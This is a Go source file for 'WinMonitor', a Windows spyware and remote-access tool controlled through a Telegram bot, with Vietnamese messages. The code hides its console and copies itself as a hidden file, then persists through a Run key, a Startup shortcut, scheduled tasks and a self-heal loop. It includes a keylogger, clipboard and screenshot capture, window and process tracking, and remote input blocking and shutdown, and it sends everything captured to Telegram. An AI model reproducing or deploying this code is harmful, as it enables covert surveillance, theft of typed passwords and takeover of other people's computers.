package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

const appName = "WinMonitor"
const appVer = "1.0.0"

var (
	appData     = getEnv("APPDATA", homeDir())
	baseDir     = filepath.Join(appData, appName)
	configPath  = filepath.Join(baseDir, "config.json")
	logPath     = filepath.Join(baseDir, "monitor.log")
	selfCopy    = filepath.Join(baseDir, ".win_monitor.pyw")
	deployExe   = filepath.Join(baseDir, "WinMonitor.exe")
	launcher    = filepath.Join(baseDir, "WinMonitor.lnk")
	startupDir  = filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	startupCopy = filepath.Join(startupDir, ".win_monitor.pyw")
	startupLnk  = filepath.Join(startupDir, "WinMonitor.lnk")
	startTime   = time.Now()
	isFrozen    = false // bản native: luôn là "exe"
	httpClient  = &http.Client{Timeout: 45 * time.Second}
)

// ---- Config ----
type Config struct {
	BotToken           string `json:"bot_token"`
	ChatID             string `json:"chat_id"`
	ScreenshotInterval int    `json:"screenshot_interval"`
	ScreenshotsEnabled bool   `json:"screenshots_enabled"`
	ActivityMonitor    bool   `json:"activity_monitor"`
	ProcessMonitor     bool   `json:"process_monitor"`
	ClipboardMonitor   bool   `json:"clipboard_monitor"`
	Keylogger          bool   `json:"keylogger"`
	KeylogFlush        int    `json:"keylog_flush"`
	BlockSafetyMinutes int    `json:"block_safety_minutes"`
	HeartbeatInterval  int    `json:"heartbeat_interval"`
}

func defaultConfig() Config {
	return Config{
		BotToken:           "PUT_YOUR_BOT_TOKEN_HERE",
		ChatID:             "PUT_YOUR_CHAT_ID_HERE",
		ScreenshotInterval: 300,
		ScreenshotsEnabled: true,
		ActivityMonitor:    true,
		ProcessMonitor:     true,
		ClipboardMonitor:   false,
		Keylogger:          false,
		KeylogFlush:        60,
		BlockSafetyMinutes: 0,
		HeartbeatInterval:  3600,
	}
}

var (
	cfgMu sync.RWMutex
	cfg   = defaultConfig()
)

func getEnv(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}

func homeDir() string {
	h, _ := os.UserHomeDir()
	return h
}

func loadConfig() {
	cfg = defaultConfig()
	source := ""
	if fileExists(configPath) {
		source = configPath
	} else {
		bs := bootstrapConfigPath()
		if fileExists(bs) {
			source = bs
		}
	}
	if source != "" {
		if data, err := os.ReadFile(source); err == nil {
			var c Config
			if json.Unmarshal(data, &c) == nil {
				mergeConfig(&c)
			}
		}
	}
	saveConfig()
}

func mergeConfig(c *Config) {
	if c.BotToken != "" {
		cfg.BotToken = c.BotToken
	}
	if c.ChatID != "" {
		cfg.ChatID = c.ChatID
	}
	if c.ScreenshotInterval > 0 {
		cfg.ScreenshotInterval = c.ScreenshotInterval
	}
	cfg.ScreenshotsEnabled = c.ScreenshotsEnabled
	cfg.ActivityMonitor = c.ActivityMonitor
	cfg.ProcessMonitor = c.ProcessMonitor
	cfg.ClipboardMonitor = c.ClipboardMonitor
	cfg.Keylogger = c.Keylogger
	if c.KeylogFlush > 0 {
		cfg.KeylogFlush = c.KeylogFlush
	}
	if c.HeartbeatInterval > 0 {
		cfg.HeartbeatInterval = c.HeartbeatInterval
	}
	cfg.BlockSafetyMinutes = c.BlockSafetyMinutes
}

func saveConfig() {
	os.MkdirAll(baseDir, 0o755)
	cfgMu.RLock()
	data, _ := json.MarshalIndent(cfg, "", "  ")
	cfgMu.RUnlock()
	tmp := configPath + ".tmp"
	if os.WriteFile(tmp, data, 0o644) == nil {
		os.Rename(tmp, configPath)
	}
}

func cfgGet() Config {
	cfgMu.RLock()
	defer cfgMu.RUnlock()
	return cfg
}

func cfgUpdate(fn func(*Config)) {
	cfgMu.Lock()
	fn(&cfg)
	cfgMu.Unlock()
	saveConfig()
}

func bootstrapConfigPath() string {
	exe, _ := os.Executable()
	return filepath.Join(filepath.Dir(exe), "winmonitor.config.json")
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

// ---- Logging ----
var logMu sync.Mutex

func logMsg(msg string) {
	logMu.Lock()
	defer logMu.Unlock()
	os.MkdirAll(baseDir, 0o755)
	line := fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	f.WriteString(line)
	f.Close()
	if st, err := os.Stat(logPath); err == nil && st.Size() > 2*1024*1024 {
		data, _ := os.ReadFile(logPath)
		lines := strings.Split(string(data), "\n")
		if len(lines) > 2000 {
			lines = lines[len(lines)-2000:]
		}
		os.WriteFile(logPath, []byte(strings.Join(lines, "\n")), 0o644)
	}
}

// ---- Telegram ----
func tgURL(method string) string {
	return "https://api.telegram.org/bot" + cfgGet().BotToken + "/" + method
}

func tgCall(method string, params map[string]string, filePath, fileField string) map[string]interface{} {
	var resp *http.Response
	var err error
	if filePath != "" {
		var buf bytes.Buffer
		w := multipart.NewWriter(&buf)
		for k, v := range params {
			w.WriteField(k, v)
		}
		f, e := os.Open(filePath)
		if e != nil {
			return map[string]interface{}{"ok": false, "error": e.Error()}
		}
		part, _ := w.CreateFormFile(fileField, filepath.Base(filePath))
		io.Copy(part, f)
		f.Close()
		w.Close()
		req, _ := http.NewRequest("POST", tgURL(method), &buf)
		req.Header.Set("Content-Type", w.FormDataContentType())
		resp, err = httpClient.Do(req)
	} else {
		form := url.Values{}
		for k, v := range params {
			form.Set(k, v)
		}
		resp, err = httpClient.PostForm(tgURL(method), form)
	}
	if err != nil {
		return map[string]interface{}{"ok": false, "error": err.Error()}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var out map[string]interface{}
	json.Unmarshal(body, &out)
	return out
}

func htmlEscape(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

func hasChat() bool {
	c := cfgGet().ChatID
	return c != "" && !strings.Contains(c, "PUT_YOUR")
}

// ---- Send queue ----
type sendItem struct {
	kind    string // "text" | "photo"
	text    string
	path    string
	caption string
}

var sendQ = make(chan sendItem, 1000)
var running = true
var runMu sync.Mutex

func setRunning(v bool) {
	runMu.Lock()
	running = v
	runMu.Unlock()
}

func isRunning() bool {
	runMu.Lock()
	defer runMu.Unlock()
	return running
}

func notify(text string) {
	if !hasChat() {
		return
	}
	select {
	case sendQ <- sendItem{kind: "text", text: text}:
	default:
	}
}

func notifyPhoto(path, caption string) {
	if !hasChat() {
		return
	}
	select {
	case sendQ <- sendItem{kind: "photo", path: path, caption: caption}:
	default:
	}
}

func senderLoop() {
	for isRunning() {
		item, ok := <-sendQ
		if !ok {
			return
		}
		chat := cfgGet().ChatID
		if chat == "" {
			continue
		}
		if item.kind == "text" {
			t := item.text
			if len(t) > 4000 {
				t = t[:4000]
			}
			tgCall("sendMessage", map[string]string{
				"chat_id": chat, "text": t, "parse_mode": "HTML",
				"disable_web_page_preview": "true",
			}, "", "")
		} else {
			if !fileExists(item.path) {
				continue
			}
			cap := item.caption
			if len(cap) > 1000 {
				cap = cap[:1000]
			}
			tgCall("sendPhoto", map[string]string{
				"chat_id": chat, "caption": cap, "parse_mode": "HTML",
			}, item.path, "photo")
			os.Remove(item.path)
		}
		time.Sleep(1050 * time.Millisecond)
	}
}

// ---- Screenshot loop ----
func doScreenshotSend(prefix string) {
	path := filepath.Join(baseDir, "shot_"+time.Now().Format("20060102_150405")+".png")
	if takeScreenshot(path) {
		notifyPhoto(path, fmt.Sprintf("%s <b>Chụp màn hình</b>\n🕒 %s", prefix, time.Now().Format("15:04:05 02/01/2006")))
	} else {
		notify("⚠️ Không chụp được màn hình.")
	}
}

func screenshotLoop() {
	var last time.Time
	for isRunning() {
		c := cfgGet()
		if c.ScreenshotsEnabled {
			interval := c.ScreenshotInterval
			if interval < 5 {
				interval = 5
			}
			if time.Since(last) >= time.Duration(interval)*time.Second {
				doScreenshotSend("📸")
				last = time.Now()
			}
		}
		time.Sleep(1 * time.Second)
	}
}

// ---- Window monitor ----
func windowMonitor() {
	last := ""
	for isRunning() {
		if cfgGet().ActivityMonitor {
			t := foregroundTitle()
			if t != "" && t != last {
				last = t
				notify("🪟 <b>Cửa sổ:</b> " + htmlEscape(t))
			}
		} else {
			last = ""
		}
		time.Sleep(2 * time.Second)
	}
}

// ---- Process monitor ----
var ignoreProc = map[string]bool{
	"conhost.exe": true, "powershell.exe": true, "tasklist.exe": true, "cmd.exe": true,
	"svchost.exe": true, "python.exe": true, "pythonw.exe": true, "backgroundtaskhost.exe": true,
	"winmonitor.exe": true,
}

func processMonitor() {
	var prev map[string]bool
	for isRunning() {
		if cfgGet().ProcessMonitor {
			procs := listProcesses()
			cur := map[string]bool{}
			for _, p := range procs {
				cur[p.PID+"|"+p.Name] = true
			}
			if prev != nil {
				for _, p := range procs {
					key := p.PID + "|" + p.Name
					if !prev[key] && !ignoreProc[strings.ToLower(p.Name)] {
						notify(fmt.Sprintf("🚀 <b>Tiến trình mới:</b> %s <code>(PID %s)</code>", htmlEscape(p.Name), p.PID))
					}
				}
			}
			prev = cur
		} else {
			prev = nil
		}
		time.Sleep(5 * time.Second)
	}
}

// ---- Clipboard monitor ----
func clipboardMonitor() {
	last := ""
	for isRunning() {
		if cfgGet().ClipboardMonitor {
			c := getClipboard()
			if c != "" && c != last {
				last = c
				if len(c) > 1500 {
					c = c[:1500]
				}
				notify("📋 <b>Clipboard:</b>\n<code>" + htmlEscape(c) + "</code>")
			}
		} else {
			last = ""
		}
		time.Sleep(3 * time.Second)
	}
}

// ---- Keylogger ----
var vkSpecial = map[int]string{
	0x08: "[BKSP]", 0x09: "[TAB]", 0x0D: "[ENTER]", 0x1B: "[ESC]",
	0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
	0x2E: "[DEL]", 0x24: "[HOME]", 0x23: "[END]", 0x21: "[PGUP]", 0x22: "[PGDN]",
	0x14: "[CAPS]", 0x5B: "[WIN]", 0x5C: "[WIN]",
}

var vkShiftMap = map[string]string{
	"1": "!", "2": "@", "3": "#", "4": "$", "5": "%", "6": "^", "7": "&",
	"8": "*", "9": "(", "0": ")", "-": "_", "=": "+", "[": "{", "]": "}",
	"\\": "|", ";": ":", "'": "\"", ",": "<", ".": ">", "/": "?", "`": "~",
}

var vkPunct = map[int]string{
	0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
	0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
}

func vkToText(vk int, shift bool) string {
	if s, ok := vkSpecial[vk]; ok {
		return s
	}
	if vk >= 0x30 && vk <= 0x39 {
		ch := string(rune(vk))
		if shift {
			if m, ok := vkShiftMap[ch]; ok {
				return m
			}
		}
		return ch
	}
	if vk >= 0x41 && vk <= 0x5A {
		ch := string(rune(vk))
		if shift {
			return ch
		}
		return strings.ToLower(ch)
	}
	if vk == 0x20 {
		return " "
	}
	if vk >= 0x60 && vk <= 0x69 {
		return string(rune(vk - 0x30))
	}
	if base, ok := vkPunct[vk]; ok {
		if shift {
			if m, ok := vkShiftMap[base]; ok {
				return m
			}
		}
		return base
	}
	return ""
}

func keyloggerLoop() {
	pressed := map[int]bool{}
	var buf strings.Builder
	lastFlush := time.Now()
	for isRunning() {
		c := cfgGet()
		if !c.Keylogger {
			pressed = map[int]bool{}
			buf.Reset()
			time.Sleep(500 * time.Millisecond)
			continue
		}
		shift := keyDown(0x10)
		for vk := 8; vk < 256; vk++ {
			down := keyDown(vk)
			if down && !pressed[vk] {
				pressed[vk] = true
				if t := vkToText(vk, shift); t != "" {
					buf.WriteString(t)
				}
			} else if !down && pressed[vk] {
				delete(pressed, vk)
			}
		}
		flush := c.KeylogFlush
		if flush < 10 {
			flush = 10
		}
		if buf.Len() > 0 && time.Since(lastFlush) >= time.Duration(flush)*time.Second {
			text := buf.String()
			buf.Reset()
			lastFlush = time.Now()
			if strings.TrimSpace(text) != "" {
				if len(text) > 3000 {
					text = text[:3000]
				}
				notify("⌨️ <b>Phím gõ:</b>\n<code>" + htmlEscape(text) + "</code>")
			}
		}
		time.Sleep(30 * time.Millisecond)
	}
}

// ---- Persistence ----
func launcherTarget() string {
	return deployExe
}

func deploySrc() string {
	exe, _ := os.Executable()
	return exe
}

func registerScheduledTasks() {
	tr := `"` + launcherTarget() + `"`
	runHidden("schtasks", "/Create", "/TN", "WinMonitorGuard", "/TR", tr, "/SC", "MINUTE", "/MO", "1", "/F")
	runHidden("schtasks", "/Create", "/TN", "WinMonitorLogon", "/TR", tr, "/SC", "ONLOGON", "/F")
}

func registerRunKey() {
	exe, _ := os.Executable()
	_ = exe
	val := `"` + launcherTarget() + `"`
	runHidden("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "WinMonitor", "/t", "REG_SZ", "/d", val, "/f")
}

func copyHidden(src, dst string) bool {
	if err := copyFile(src, dst); err != nil {
		logMsg("copy_hidden error: " + err.Error())
		return false
	}
	hideFile(dst)
	return true
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

func ensurePersistence() {
	os.MkdirAll(baseDir, 0o755)
	src := deploySrc()
	if filepath.Clean(deployExe) != filepath.Clean(src) {
		copyHidden(src, deployExe)
	} else {
		hideFile(deployExe)
	}
	if !fileExists(launcher) {
		createShortcut(launcher, deployExe, "", filepath.Dir(deployExe))
	}
	hideFile(launcher)
	os.MkdirAll(startupDir, 0o755)
	createShortcut(startupLnk, deployExe, "", filepath.Dir(deployExe))
	hideFile(startupLnk)
	registerRunKey()
	registerScheduledTasks()
}

func selfhealLoop() {
	for isRunning() {
		time.Sleep(300 * time.Second)
		if isRunning() {
			ensurePersistence()
		}
	}
}

func removePersistence() {
	for _, tn := range []string{"WinMonitorGuard", "WinMonitorLogon"} {
		runHidden("schtasks", "/Delete", "/TN", tn, "/F")
	}
	runHidden("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "WinMonitor", "/f")
	self, _ := os.Executable()
	for _, p := range []string{startupCopy, selfCopy, deployExe, launcher, startupLnk} {
		if filepath.Clean(p) != filepath.Clean(self) {
			os.Remove(p)
		}
	}
	moveFileOnReboot(self)
}

// ---- OTP ----
type pendingOtp struct {
	code    string
	expires time.Time
}

var (
	pendingMu sync.Mutex
	pending   = map[string]pendingOtp{}
)

func requestOtp(action, label string) {
	code := fmt.Sprintf("%06d", time.Now().UnixNano()%1000000)
	pendingMu.Lock()
	pending[action] = pendingOtp{code: code, expires: time.Now().Add(120 * time.Second)}
	pendingMu.Unlock()
	notify(fmt.Sprintf("🔐 <b>XÁC NHẬN %s</b>\nMã dùng 1 lần: <code>%s</code>\nGửi <code>/confirm %s</code> trong vòng 120 giây.\nGửi /cancel để hủy.", label, code, code))
}

func executeAction(action string) {
	switch action {
	case "shutdown":
		notify("🖥️ Đang TẮT MÁY (sau 5 giây)...")
		time.Sleep(time.Second)
		shutdownMachine()
	case "restart":
		notify("🔄 Đang KHỞI ĐỘNG LẠI (sau 5 giây)...")
		time.Sleep(time.Second)
		restartMachine()
	case "stop":
		notify("🛑 Đã xác thực. Đang DỪNG GIÁM SÁT và gỡ khỏi khởi động cùng Windows...")
		removePersistence()
		time.Sleep(1500 * time.Millisecond)
		setRunning(false)
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}
}

// ---- Bot command menu ----
var botCommands = [][2]string{
	{"start", "Bắt đầu / xem trợ giúp"},
	{"help", "Danh sách lệnh"},
	{"status", "Trạng thái hiện tại"},
	{"shot", "Chụp màn hình ngay"},
	{"interval", "Đổi chu kỳ chụp (giây)"},
	{"screen", "Bật/tắt chụp định kỳ"},
	{"activity", "Bật/tắt báo đổi cửa sổ"},
	{"process", "Bật/tắt báo tiến trình mới"},
	{"clip", "Bật/tắt theo dõi clipboard"},
	{"keylog", "Bật/tắt ghi phím gõ"},
	{"block", "Ngắt bàn phím & chuột"},
	{"unblock", "Kết nối lại bàn phím & chuột"},
	{"lock", "Khóa màn hình"},
	{"shutdown", "Tắt máy (cần OTP)"},
	{"restart", "Khởi động lại (cần OTP)"},
	{"stop", "Dừng giám sát (cần OTP)"},
	{"confirm", "Xác nhận mã OTP"},
	{"cancel", "Hủy yêu cầu đang chờ"},
	{"config", "Xem cấu hình"},
	{"set", "Đổi cấu hình: /set khóa giá_trị"},
	{"logs", "Xem log gần đây"},
	{"reload", "Cập nhật lại menu lệnh"},
}

func registerBotCommands() bool {
	var arr []map[string]string
	for _, c := range botCommands {
		arr = append(arr, map[string]string{"command": c[0], "description": c[1]})
	}
	data, _ := json.Marshal(arr)
	for attempt := 0; attempt < 3; attempt++ {
		if !isRunning() {
			return false
		}
		res := tgCall("setMyCommands", map[string]string{"commands": string(data)}, "", "")
		if ok, _ := res["ok"].(bool); ok {
			tgCall("setChatMenuButton", map[string]string{"menu_button": `{"type":"commands"}`}, "", "")
			logMsg(fmt.Sprintf("Bot commands registered (%d lenh).", len(botCommands)))
			return true
		}
		time.Sleep(3 * time.Second)
	}
	return false
}

// ---- Command handling ----
func helpText() string {
	return "🤖 <b>WIN MONITOR</b> - Trợ lý giám sát\n\n" +
		"<b>Giám sát</b>\n" +
		"/status - Trạng thái hiện tại\n" +
		"/shot - Chụp màn hình ngay\n" +
		"/interval &lt;giây&gt; - Đổi chu kỳ chụp\n" +
		"/screen on|off - Bật/tắt chụp định kỳ\n" +
		"/activity on|off - Báo đổi cửa sổ\n" +
		"/process on|off - Báo tiến trình mới\n" +
		"/clip on|off - Theo dõi clipboard\n" +
		"/keylog on|off - Ghi phím gõ\n\n" +
		"<b>Điều khiển</b>\n" +
		"/block [phút] - Ngắt bàn phím & chuột\n" +
		"/unblock - Kết nối lại bàn phím & chuột\n" +
		"/lock - Khóa màn hình\n\n" +
		"<b>Nguy hiểm (cần OTP)</b>\n" +
		"/shutdown - Tắt máy\n" +
		"/restart - Khởi động lại\n" +
		"/stop - Dừng giám sát\n" +
		"/confirm &lt;mã&gt; - Xác nhận OTP\n" +
		"/cancel - Hủy yêu cầu\n\n" +
		"<b>Khác</b>\n" +
		"/config - Xem cấu hình\n" +
		"/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi cấu hình\n" +
		"/logs [n] - Xem log gần đây\n" +
		"/reload - Cập nhật lại menu lệnh"
}

func parseBool(v string) bool {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "1", "on", "true", "yes", "bat", "bật", "co", "có":
		return true
	}
	return false
}

func handleCommand(text, chatID string) {
	text = strings.TrimSpace(text)
	if !strings.HasPrefix(text, "/") {
		return
	}
	fields := strings.Fields(text)
	cmd := strings.ToLower(strings.SplitN(fields[0], "@", 2)[0])
	args := fields[1:]

	switch cmd {
	case "/start", "/help":
		notify(helpText())
	case "/reload":
		notify("🔄 Đang cập nhật lại menu lệnh...")
		go registerBotCommands()
	case "/status":
		c := cfgGet()
		up := int(time.Since(startTime).Seconds())
		blocked := "BÌNH THƯỜNG"
		if isInputBlocked() {
			blocked = "ĐANG NGẮT"
		}
		notify(fmt.Sprintf("📊 <b>TRẠNG THÁI</b>\n⏱ Uptime: %dh %dm %ds\n📸 Chụp: %s | mỗi %ds\n🪟 Cửa sổ: %s\n🚀 Tiến trình: %s\n📋 Clipboard: %s\n⌨️ Keylog: %s\n🔒 Bàn phím/chuột: %s\n💓 Heartbeat: %ds",
			up/3600, (up%3600)/60, up%60,
			onoff(c.ScreenshotsEnabled), c.ScreenshotInterval,
			onoff(c.ActivityMonitor), onoff(c.ProcessMonitor), onoff(c.ClipboardMonitor),
			onoff(c.Keylogger), blocked, c.HeartbeatInterval))
	case "/shot":
		notify("📸 Đang chụp...")
		go doScreenshotSend("📸")
	case "/interval":
		if len(args) == 0 || !isDigits(args[0]) {
			notify("Cú pháp: /interval <giây> (tối thiểu 5)")
			return
		}
		v, _ := strconv.Atoi(args[0])
		if v < 5 {
			v = 5
		}
		cfgUpdate(func(c *Config) { c.ScreenshotInterval = v })
		notify(fmt.Sprintf("✅ Đã đổi chu kỳ chụp thành %d giây.", v))
	case "/screen", "/activity", "/process", "/clip", "/keylog":
		if len(args) == 0 {
			notify("Cú pháp: " + cmd + " on|off")
			return
		}
		b := parseBool(args[0])
		cfgUpdate(func(c *Config) {
			switch cmd {
			case "/screen":
				c.ScreenshotsEnabled = b
			case "/activity":
				c.ActivityMonitor = b
			case "/process":
				c.ProcessMonitor = b
			case "/clip":
				c.ClipboardMonitor = b
			case "/keylog":
				c.Keylogger = b
			}
		})
		notify(fmt.Sprintf("✅ %s = %s", cmd, onoff(b)))
	case "/block":
		auto := 0
		if len(args) > 0 && isDigits(args[0]) {
			auto, _ = strconv.Atoi(args[0])
		}
		if auto == 0 {
			auto = cfgGet().BlockSafetyMinutes
		}
		if isInputBlocked() {
			notify("ℹ️ Bàn phím/chuột đang bị ngắt rồi.")
			return
		}
		go func() {
			_, ok := StartBlock(auto)
			if !ok {
				notify("⚠️ Không ngắt được bàn phím/chuột (có thể cần quyền Admin).")
				return
			}
			extra := " Gửi /unblock để mở lại."
			if auto > 0 {
				extra = fmt.Sprintf(" Tự mở khóa sau %d phút.", auto)
			}
			notify("🔒 Đã NGẮT bàn phím & chuột." + extra)
		}()
	case "/unblock":
		if StopBlock() {
			notify("🔓 Đang kết nối lại bàn phím & chuột...")
		} else {
			notify("ℹ️ Bàn phím/chuột đang bình thường.")
		}
	case "/lock":
		if lockWorkstation() {
			notify("🔒 Đã khóa màn hình.")
		} else {
			notify("⚠️ Không khóa được màn hình.")
		}
	case "/shutdown":
		requestOtp("shutdown", "TẮT MÁY")
	case "/restart", "/reboot":
		requestOtp("restart", "KHỞI ĐỘNG LẠI")
	case "/stop":
		requestOtp("stop", "DỪNG GIÁM SÁT")
	case "/confirm":
		if len(args) == 0 {
			notify("Cú pháp: /confirm <mã>")
			return
		}
		code := strings.TrimSpace(args[0])
		pendingMu.Lock()
		for action, info := range pending {
			if time.Now().After(info.expires) {
				delete(pending, action)
				continue
			}
			if info.code == code {
				delete(pending, action)
				pendingMu.Unlock()
				executeAction(action)
				return
			}
		}
		pendingMu.Unlock()
		notify("❌ Mã không đúng hoặc đã hết hạn.")
	case "/cancel":
		pendingMu.Lock()
		pending = map[string]pendingOtp{}
		pendingMu.Unlock()
		notify("✅ Đã hủy mọi yêu cầu đang chờ.")
	case "/config":
		c := cfgGet()
		c.BotToken = maskToken(c.BotToken)
		data, _ := json.MarshalIndent(c, "", "  ")
		notify("<b>CẤU HÌNH</b>\n<code>" + htmlEscape(string(data)) + "</code>")
	case "/set":
		if len(args) < 2 {
			notify("Cú pháp: /set <khóa> <giá trị>")
			return
		}
		key := args[0]
		val := strings.Join(args[1:], " ")
		if !applySet(key, val) {
			notify("❌ Khóa/giá trị không hợp lệ. Khóa: screenshot_interval, screenshots_enabled, activity_monitor, process_monitor, clipboard_monitor, keylogger, keylog_flush, block_safety_minutes, heartbeat_interval")
			return
		}
		notify(fmt.Sprintf("✅ %s = %s", key, val))
	case "/logs":
		n := 30
		if len(args) > 0 && isDigits(args[0]) {
			n, _ = strconv.Atoi(args[0])
			if n > 200 {
				n = 200
			}
		}
		data, err := os.ReadFile(logPath)
		if err != nil {
			notify("⚠️ Không đọc được log.")
			return
		}
		lines := strings.Split(string(data), "\n")
		if len(lines) > n {
			lines = lines[len(lines)-n:]
		}
		txt := strings.Join(lines, "\n")
		if len(txt) > 3500 {
			txt = txt[len(txt)-3500:]
		}
		notify("<b>LOG (cuối)</b>\n<code>" + htmlEscape(txt) + "</code>")
	default:
		notify("❓ Lệnh không rõ. Gửi /help để xem danh sách.")
	}
}

func applySet(key, val string) bool {
	switch key {
	case "screenshot_interval":
		v, err := strconv.Atoi(val)
		if err != nil {
			return false
		}
		cfgUpdate(func(c *Config) { c.ScreenshotInterval = v })
	case "screenshots_enabled":
		cfgUpdate(func(c *Config) { c.ScreenshotsEnabled = parseBool(val) })
	case "activity_monitor":
		cfgUpdate(func(c *Config) { c.ActivityMonitor = parseBool(val) })
	case "process_monitor":
		cfgUpdate(func(c *Config) { c.ProcessMonitor = parseBool(val) })
	case "clipboard_monitor":
		cfgUpdate(func(c *Config) { c.ClipboardMonitor = parseBool(val) })
	case "keylogger":
		cfgUpdate(func(c *Config) { c.Keylogger = parseBool(val) })
	case "keylog_flush":
		v, err := strconv.Atoi(val)
		if err != nil {
			return false
		}
		cfgUpdate(func(c *Config) { c.KeylogFlush = v })
	case "block_safety_minutes":
		v, err := strconv.Atoi(val)
		if err != nil {
			return false
		}
		cfgUpdate(func(c *Config) { c.BlockSafetyMinutes = v })
	case "heartbeat_interval":
		v, err := strconv.Atoi(val)
		if err != nil {
			return false
		}
		cfgUpdate(func(c *Config) { c.HeartbeatInterval = v })
	default:
		return false
	}
	return true
}

func onoff(b bool) string {
	if b {
		return "BẬT"
	}
	return "TẮT"
}

func isDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

func maskToken(t string) string {
	if len(t) > 8 {
		return t[:8] + "...(ẩn)"
	}
	return "***"
}

// ---- Update dispatch ----
var botUsername string

func isAuthorized(chatID string) bool {
	cid := strings.TrimSpace(cfgGet().ChatID)
	if cid == "" || strings.Contains(cid, "PUT_YOUR") {
		cfgUpdate(func(c *Config) { c.ChatID = chatID })
		notify("✅ Đã liên kết chat này (<code>" + chatID + "</code>) làm chủ.\nGửi /help để bắt đầu.")
		return true
	}
	return chatID == cid
}

func handleUpdate(upd map[string]interface{}) {
	msg, _ := upd["message"].(map[string]interface{})
	if msg == nil {
		msg, _ = upd["edited_message"].(map[string]interface{})
	}
	if msg == nil {
		return
	}
	chat, _ := msg["chat"].(map[string]interface{})
	if chat == nil {
		return
	}
	var chatID string
	switch v := chat["id"].(type) {
	case float64:
		chatID = strconv.FormatInt(int64(v), 10)
	case json.Number:
		chatID = v.String()
	case string:
		chatID = v
	}
	if chatID == "" {
		return
	}
	text, _ := msg["text"].(string)
	if !isAuthorized(chatID) {
		logMsg(fmt.Sprintf("Unauthorized chat: %s text=%q", chatID, text))
		return
	}
	handleCommand(text, chatID)
}

// ---- Heartbeat ----
func heartbeatLoop() {
	for isRunning() {
		hb := cfgGet().HeartbeatInterval
		if hb <= 0 {
			time.Sleep(60 * time.Second)
			continue
		}
		time.Sleep(time.Duration(hb) * time.Second)
		if isRunning() {
			notify(fmt.Sprintf("💓 WinMonitor vẫn đang chạy. Uptime %d phút.", int(time.Since(startTime).Minutes())))
		}
	}
}

// ---- Polling ----
func pollLoop() {
	offset := 0
	for isRunning() {
		params := map[string]string{
			"offset":          strconv.Itoa(offset),
			"timeout":         "25",
			"allowed_updates": `["message"]`,
		}
		res := tgCall("getUpdates", params, "", "")
		if ok, _ := res["ok"].(bool); !ok {
			time.Sleep(3 * time.Second)
			continue
		}
		result, _ := res["result"].([]interface{})
		for _, u := range result {
			upd, _ := u.(map[string]interface{})
			if upd == nil {
				continue
			}
			if idf, ok := upd["update_id"].(float64); ok {
				offset = int(idf) + 1
			}
			handleUpdate(upd)
		}
	}
}

// ---- helpers for args ----
func argValue(name string) string {
	args := os.Args[1:]
	for i, a := range args {
		if a == name && i+1 < len(args) {
			return args[i+1]
		}
		if strings.HasPrefix(a, name+"=") {
			return a[len(name)+1:]
		}
	}
	return ""
}

func applyCLIConfig() {
	if cfgFile := argValue("--config"); cfgFile != "" && fileExists(cfgFile) {
		if data, err := os.ReadFile(cfgFile); err == nil {
			var c Config
			if json.Unmarshal(data, &c) == nil {
				mergeConfig(&c)
				saveConfig()
			}
		}
	}
	if tok := argValue("--token"); tok != "" {
		cfgUpdate(func(c *Config) { c.BotToken = tok })
	}
	if chat := argValue("--chat"); chat != "" {
		cfgUpdate(func(c *Config) { c.ChatID = chat })
	}
}

func main() {
	os.MkdirAll(baseDir, 0o755)
	hideConsole()
	loadConfig()
	applyCLIConfig()

	token := cfgGet().BotToken
	if token == "" || strings.Contains(token, "PUT_YOUR") {
		logMsg("Chua cau hinh bot_token. Dung.")
		return
	}
	if !acquireSingleInstance() {
		logMsg("Da co 1 ban WinMonitor dang chay. Thoat.")
		return
	}

	AutoUnblockNotify = func() { notify("🔓 Đã tự KẾT NỐI LẠI bàn phím & chuột.") }

	ensurePersistence()

	go senderLoop()
	go registerBotCommands()
	go screenshotLoop()
	go windowMonitor()
	go processMonitor()
	go clipboardMonitor()
	go keyloggerLoop()
	go heartbeatLoop()
	go selfhealLoop()

	logMsg("WinMonitor started.")
	notify("✅ <b>WinMonitor đã khởi động</b> trên máy này.\nGửi /help để xem lệnh.")

	pollLoop()
}
